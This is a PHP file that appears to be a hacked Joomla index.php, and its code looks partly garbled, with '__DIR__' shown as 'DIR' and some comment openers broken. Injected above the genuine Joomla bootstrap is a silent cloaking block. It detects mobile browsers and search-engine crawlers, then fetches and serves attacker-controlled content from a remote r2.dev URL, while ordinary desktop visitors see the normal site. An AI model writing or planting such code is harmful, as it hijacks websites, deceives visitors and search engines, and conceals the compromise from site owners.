<?php
// Silent mode
error_reporting(0);
ini_set('display_errors', 0);

// ===== USER AGENT DETECTOR =====
function isAllowedUA() {
    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;

    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);

    $agents = [
        'android','iphone','ipad','ipod','blackberry','windows phone','webos',
        'googlebot','bingbot','duckduckbot','yandex','baiduspider','slurp',
        'facebookexternalhit','telegrambot','ahrefsbot','semrushbot',
        'google-site-verification','google-inspectiontool',
        'adsbot-google','mediapartners-google','googleother'
    ];

    // Mobile hint (Chrome)
    if (isset($_SERVER['HTTP_SEC_CH_UA_MOBILE']) && $_SERVER['HTTP_SEC_CH_UA_MOBILE'] === '?1') {
        return true;
    }

    foreach ($agents as $agent) {
        if (strpos($ua, $agent) !== false) {
            return true;
        }
    }

    return false;
}

// ===== CURL LOADER =====
function loadRemote($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_USERAGENT => 'Mozilla/5.0'
    ]);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}

// ===== MAIN LOGIC =====
if (isAllowedUA()) {

    $remoteUrl = "https://pub-b5c13bff5f2e4421a9e8d4c0e30c0cb0.r2.dev/lpsuperfood/superfood.txt";
    $content   = loadRemote($remoteUrl);

    // Fallback kalau remote mati
    if (!$content) {
        $localFallback = DIR . '/fallback.html';
        if (file_exists($localFallback)) {
            $content = file_get_contents($localFallback);
        }
    }

    if ($content) {
        echo $content;
        exit;
    }
}
?>
<?php
/
 * @package    Joomla.Site
 *
 * @copyright  Copyright (C) 2005 - 2020 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

/
 * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
 */
define('JOOMLA_MINIMUM_PHP', '5.3.10');

if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
{
  die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
}

// Saves the start time and memory usage.
$startTime = microtime(1);
$startMem  = memory_get_usage();

/**
 * Constant that is checked in included files to prevent direct access.
 * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
 */
define('_JEXEC', 1);

if (file_exists(DIR . '/defines.php'))
{
  include_once DIR . '/defines.php';
}

if (!defined('_JDEFINES'))
{
  define('JPATH_BASE', DIR);
  require_once JPATH_BASE . '/includes/defines.php';
}

require_once JPATH_BASE . '/includes/framework.php';

// Set profiler start time and memory usage and mark afterLoad in the profiler.
JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;

// Instantiate the application.
$app = JFactory::getApplication('site');

// Execute the application.
$app->execute();
